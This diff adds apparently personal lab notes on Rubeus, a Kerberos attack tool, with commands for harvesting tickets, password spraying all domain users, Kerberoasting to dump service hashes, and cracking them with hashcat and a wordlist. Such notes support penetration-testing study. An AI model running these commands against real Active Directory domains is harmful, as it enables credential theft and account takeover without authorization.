@@ -1,0 +1,34 @@
+# Rubeus
+
+Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation
+of the kekeo tool and developed by HarmJ0y the very well known active
+directory guru.
+
+Rubeus has a wide variety of attacks and features that allow it to be a
+very versatile tool for attacking Kerberos. Just some of the many tools
+and attacks include overpass the hash, ticket requests and renewals,
+ticket management, ticket extraction, harvesting, pass the ticket,
+AS-REP Roasting, and Kerberoasting.
+
+
+# Before using Rubeus
+If the machine is outside domain, add the Domain Controller
+in the hosts file by doing from a "cmd.exe":
+
+    echo 10.10.3.23 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+
+## Harvest Tickets (on a Domain Controller ???)
+;; If we are on a domain controller we can harvest ticket
+;; This command tells Rubeus to harvest for TGTs every 30 seconds
+Rubeus.exe harvest /interval:30 
+
+
+## Password Spray
+;; This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
+;; Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
+Rubeus.exe brute /password:Password1 /noticket
+
+## Dump the kerberos hash of any kerberoastable user
+Rubeus.exe kerberoast /outfile:hashes.txt
+;; these can be cracked by doing:
+;; hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o results.txt
